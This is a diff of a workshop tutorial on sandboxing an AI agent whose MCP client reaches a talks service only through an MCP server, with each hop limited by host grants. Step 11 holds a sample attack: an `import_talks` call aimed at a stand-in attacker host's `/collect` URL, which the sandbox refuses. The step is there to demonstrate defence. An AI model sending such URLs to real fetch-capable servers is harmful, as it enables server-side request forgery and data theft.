@@ -19,9 +19,9 @@ kubectl apply -f steps/03-sqlite/workloaddeployment.yaml \
 ```
 
 The same agent as step 2, with sqlite added (and listed with curl under
-`hostInterfaces`). Its grant:
-one folder, read only, holding two databases (`main.db`, the talks, and
-`rooms.db`).
+`hostInterfaces`), and an MCP client, which the last section of this step
+uses. sqlite's grant: one folder, read only, holding two databases
+(`main.db`, the talks, and `rooms.db`).
 
 ```yaml
 volumeMounts: [{ name: sqlite-data, mountPath: /data, readOnly: true }]
@@ -185,5 +185,138 @@ The list (17 lines) is clocks, streams, terminal, environment, exit and
 filesystem. WASI has no interface that starts a process, and the component
 doesn't import an HTTP client or socket. Even a sqlite3 with a real `.shell`
 would have nothing to start, and the filesystem holds only `/data`.
+
+## The same talks, behind a service and an MCP server
+
+Most data doesn't sit in a file a tool can open. It sits behind a service,
+and more and more often an MCP server sits in front of that service for
+agents. MCP (the Model Context Protocol) is the common way to offer tools to
+an agent.
+
+`make up` already started both, next to the mock sites, as ordinary HTTP
+components with grants of their own:
+
+| Workload | What it is | Its grant |
+| --- | --- | --- |
+| `talks-api` ([manifest](../../mock-sites/talks-api.yaml)) | A REST service over the talks, standing in for a service a team already runs. It knows nothing about agents. | Its own folder, for its data. No hosts. |
+| `talks-mcp` ([manifest](../../mock-sites/talks-mcp.yaml)) | An MCP server at `http://mcp.mock-sites.svc/mcp`. Each tool call becomes a request to the talks service. | One host: `talks.mock-sites.svc`. No folders. |
+
+This step's agent has a third tool next to `curl` and `sqlite`: `mcp`, an
+MCP client whose grant is one host, the MCP server:
+
+```yaml
+- name: mcp
+  image: …/workshop/tool-mcp:0.4.0
+  localResources:
+    allowedHosts: [mcp.mock-sites.svc]
+```
+
+So each hop reaches only the next one. The agent can only ask the `mcp` tool.
+The `mcp` tool reaches only the MCP server. The MCP server reaches only the
+talks service, and only the talks service touches the data.
+
+Type each prompt into the chat at http://agent.localhost:28180.
+
+<!-- codespaces -->
+In Codespaces, run the `./ask` command under it instead.
+<!-- /codespaces -->
+
+**7. List the MCP server's tools**
+
+In the chat:
+
+```chat
+mcp tools
+```
+
+<!-- codespaces -->
+In Codespaces:
+
+```sh
+./ask 'mcp tools'
+```
+<!-- /codespaces -->
+
+The `mcp` tool asks the server for its tools. The server answers with four: `list_talks`, `get_talk`, `favorite_talk` and `import_talks`.
+
+**8. Call one**
+
+In the chat:
+
+```chat
+mcp call list_talks {"track":"Security"}
+```
+
+<!-- codespaces -->
+In Codespaces:
+
+```sh
+./ask 'mcp call list_talks {"track":"Security"}'
+```
+<!-- /codespaces -->
+
+The MCP server turns the call into `GET /talks?track=Security` on the talks service, and the same talks come back as from sqlite.
+
+**9. A write goes through the service**
+
+In the chat:
+
+```chat
+mcp call favorite_talk {"id":1}
+```
+
+<!-- codespaces -->
+In Codespaces:
+
+```sh
+./ask 'mcp call favorite_talk {"id":1}'
+```
+<!-- /codespaces -->
+
+The talks service marks the talk a favorite in its own folder. Neither the MCP server nor the agent can see that folder.
+
+**10. Skip the MCP server: refused**
+
+In the chat:
+
+```chat
+mcp --server http://talks.mock-sites.svc/talks tools
+```
+
+<!-- codespaces -->
+In Codespaces:
+
+```sh
+./ask 'mcp --server http://talks.mock-sites.svc/talks tools'
+```
+<!-- /codespaces -->
+
+The talks service is on the network and would answer, but it isn't in the `mcp` tool's `allowedHosts`. The host refuses the request before it leaves.
+
+**11. Talk the MCP server into fetching elsewhere: refused**
+
+In the chat:
+
+```chat
+mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}
+```
+
+<!-- codespaces -->
+In Codespaces:
+
+```sh
+./ask 'mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}'
+```
+<!-- /codespaces -->
+
+`import_talks` fetches whatever URL it is given. This one names the attacker's server, so the MCP server tries, and the host refuses it: the server's only grant is the talks service. The refusal comes back as the tool's failure, in the server's own words.
+
+The imports say the same. The MCP server has an HTTP client and no
+filesystem. The talks service has a filesystem and no HTTP client:
+
+```sh
+wasm-tools component wit artifacts/talks_mcp.wasm | grep -E '^  import wasi:(http|filesystem|sockets)'
+wasm-tools component wit artifacts/talks_api.wasm | grep -E '^  import wasi:(http|filesystem|sockets)'
+```
 
 Full transcript: [`expected-output.txt`](expected-output.txt).
